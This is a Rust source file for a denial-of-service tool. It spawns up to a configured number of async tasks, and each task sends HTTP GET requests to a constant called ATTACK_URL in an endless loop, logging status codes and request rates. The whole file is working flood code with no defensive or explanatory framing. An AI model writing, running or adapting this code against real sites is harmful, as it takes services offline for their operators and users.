use core::time;
use std::thread;

use reqwest::Response;
use tokio::time::Instant;

static mut AMOUNT: u128 = 0;

static mut ON_THREADS: u128 = 0;

pub async fn start() {
    unsafe {
        loop {
            core_attack();
            thread::sleep(time::Duration::from_millis(1));
        }
    }
}

unsafe fn core_attack() {
    if ON_THREADS + 1 < crate::FORCE {
        ON_THREADS += 1;
        tokio::spawn(async {
            loop {
                let now = Instant::now();
                let error_data = request(crate::ATTACK_URL).await;
                match error_data {
                    Ok(status_code) => {
                        AMOUNT += 1;
                        println!(
                            "On threads: {}, Status code {}, Time Passed for request {} sec, Request per 10 Millisecond {}",
                            ON_THREADS,
                            status_code.status(),
                            now.elapsed().as_secs(),
                            AMOUNT
                        );
                    }
                    Err(data) => {
                        println!(
                            "On threads: {}, Status ERROR {} Request per 10 Millisecond {}",
                            ON_THREADS,
                            data,
                            AMOUNT
                        );
                    }
                }
            }
        });
    } else {
        time_function();
    }
}

unsafe fn time_function() {
    ON_THREADS += 1;
    loop {
        thread::sleep(time::Duration::from_millis(10));
        AMOUNT = 0;
    }
}

async fn request(url: &str) -> Result<Response, reqwest::Error> {
    let output = reqwest::Client::new().get(url).send().await;
    match output {
        Ok(data) => Ok(data),
        Err(err) => Err(err),
    }
}
